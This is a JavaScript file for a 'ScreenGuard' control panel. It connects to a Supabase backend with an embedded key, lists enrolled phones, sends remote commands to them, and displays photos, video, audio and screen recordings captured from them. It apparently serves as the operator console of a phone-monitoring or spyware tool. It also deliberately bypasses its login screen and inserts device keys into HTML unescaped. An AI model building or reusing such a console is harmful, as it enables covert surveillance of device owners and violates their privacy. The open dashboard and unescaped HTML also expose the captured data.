// ============================================
// SCREENGUARD PANEL (No Password)
// ============================================

const SUPABASE_URL = "https://weyfoshcpyqjbcmpxrqq.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndleWZvc2hjcHlxamJjbXB4cnFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTEyODIzNDEsImV4cCI6MjEwNjg1ODM0MX0.0ur5-MQdbtbZdG9Q7CzHAhzMv5Z7unXGti3fuz6vk0U";

let supabase = null;
let currentDeviceKey = null;

// ============================================
// INIT
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('[Panel] Loading...');

    // Supabase init
    try {
        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        console.log('[Panel] Supabase connected ✓');
    } catch (e) {
        alert('Supabase load fail: ' + e.message);
        return;
    }

    // Direct dashboard khol — no login
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');

    // Setup listeners
    document.getElementById('refreshBtn').addEventListener('click', () => location.reload());
    document.getElementById('logoutBtn').addEventListener('click', () => location.reload());

    const rm = document.getElementById('refreshMediaBtn');
    if (rm) rm.addEventListener('click', loadMedia);

    document.querySelectorAll('.action-btn[data-cmd]').forEach(btn => {
        btn.addEventListener('click', () => sendCommand(btn, btn.dataset.cmd));
    });

    // Load devices
    loadDevices();
});

// ============================================
// DEVICES
// ============================================

async function loadDevices() {
    const list = document.getElementById('devicesList');
    list.innerHTML = '<div class="loading">Loading devices...</div>';

    try {
        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('last_seen', { ascending: false });

        if (error) throw error;

        if (!data || data.length === 0) {
            list.innerHTML = '<div class="empty">📭 Koi device nahi<br><small>App install karke setup karo</small></div>';
            return;
        }

        list.innerHTML = data.map(d => {
            const isOnline = d.last_seen && (Date.now() - new Date(d.last_seen).getTime() < 5 * 60 * 1000);
            const name = ((d.brand || '') + ' ' + (d.model || '')).trim() || d.device_key.substring(0, 8);
            const battery = d.battery_level >= 0 ? d.battery_level + '%' : '—';

            return '<div class="device-card" data-key="' + d.device_key + '">' +
                '<div class="device-name">' +
                '<span class="status-dot ' + (isOnline ? 'online' : 'offline') + '"></span>' +
                escapeHtml(name) +
                '</div>' +
                '<div class="device-meta">' +
                '<span>🔋 ' + battery + '</span>' +
                '<span>' + timeAgo(d.last_seen) + '</span>' +
                '</div>' +
                '</div>';
        }).join('');

        list.querySelectorAll('.device-card').forEach(card => {
            card.addEventListener('click', () => selectDevice(card.dataset.key, data));
        });

        if (data.length === 1 && !currentDeviceKey) {
            selectDevice(data[0].device_key, data);
        }
    } catch (e) {
        console.error('[Devices]', e);
        list.innerHTML = '<div class="empty">❌ ' + e.message + '</div>';
    }
}

function selectDevice(key, devices) {
    currentDeviceKey = key;
    document.querySelectorAll('.device-card').forEach(c => {
        c.classList.toggle('active', c.dataset.key === key);
    });

    const device = devices.find(d => d.device_key === key);
    if (!device) return;

    document.getElementById('actionsSection').classList.remove('hidden');
    const name = ((device.brand || '') + ' ' + (device.model || '')).trim() || device.device_key.substring(0, 8);
    document.getElementById('selectedName').textContent = name;

    const isOnline = device.last_seen && (Date.now() - new Date(device.last_seen).getTime() < 5 * 60 * 1000);
    const statusEl = document.getElementById('selectedStatus');
    statusEl.textContent = isOnline ? '🟢 Online' : '🔴 Offline';
    statusEl.className = 'status-badge ' + (isOnline ? 'online' : 'offline');

    document.getElementById('batteryText').textContent = device.battery_level >= 0 ? device.battery_level + '%' : '—';
    document.getElementById('lastSeenText').textContent = timeAgo(device.last_seen);

    loadMedia();
}

// ============================================
// COMMANDS
// ============================================

async function sendCommand(btn, cmd) {
    if (!currentDeviceKey) {
        toast('Pehle device select karo', 'error');
        return;
    }

    if (btn) {
        btn.disabled = true;
        setTimeout(() => btn.disabled = false, 1500);
    }

    try {
        const { error } = await supabase
            .from('commands')
            .insert({
                device_key: currentDeviceKey,
                cmd: cmd,
                status: 'pending'
            });

        if (error) throw error;
        toast('✓ ' + cmd + ' bheja', 'success');
    } catch (e) {
        console.error('[Command]', e);
        toast('Fail: ' + e.message, 'error');
    }
}

function sendCustom(type) {
    const d = parseInt(document.getElementById('customDuration').value) || 30;
    sendCommand(null, type + ':' + d);
}

// ============================================
// MEDIA
// ============================================

async function loadMedia() {
    const list = document.getElementById('mediaList');
    if (!currentDeviceKey) return;

    list.innerHTML = '<div class="loading">Loading media...</div>';

    try {
        const { data, error } = await supabase
            .from('media')
            .select('*')
            .eq('device_key', currentDeviceKey)
            .order('created_at', { ascending: false })
            .limit(20);

        if (error) throw error;

        if (!data || data.length === 0) {
            list.innerHTML = '<div class="empty">Koi media nahi</div>';
            return;
        }

        list.innerHTML = data.map(m => {
            const url = m.public_url || '';
            const type = m.media_type || 'photo';
            let icon = '📄';
            if (type === 'photo') icon = '📸';
            else if (type === 'video') icon = '🎥';
            else if (type === 'audio') icon = '🎤';
            else if (type === 'screen') icon = '📹';

            return '<div class="media-item" data-url="' + escapeHtml(url) + '">' +
                '<div class="media-icon">' + icon + '</div>' +
                '<img src="' + escapeHtml(url) + '" loading="lazy" onerror="this.style.display=\'none\'">' +
                '<div class="media-item-label">' +
                '<span>' + type + '</span>' +
                '<span>' + timeAgo(m.created_at) + '</span>' +
                '</div>' +
                '</div>';
        }).join('');

        list.querySelectorAll('.media-item').forEach(item => {
            item.addEventListener('click', () => window.open(item.dataset.url, '_blank'));
        });
    } catch (e) {
        console.error('[Media]', e);
        list.innerHTML = '<div class="empty">❌ ' + e.message + '</div>';
    }
}

// ============================================
// HELPERS
// ============================================

function timeAgo(ts) {
    if (!ts) return '—';
    const diff = Date.now() - new Date(ts).getTime();
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
    if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
    return Math.floor(diff / 86400000) + 'd ago';
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str).replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#39;'
    }[c]));
}

function toast(msg, type) {
    const el = document.getElementById('toast');
    el.textContent = msg;
    el.className = 'toast ' + (type || 'info');
    el.classList.remove('hidden');
    clearTimeout(window._toastTimer);
    window._toastTimer = setTimeout(() => el.classList.add('hidden'), 2500);
}
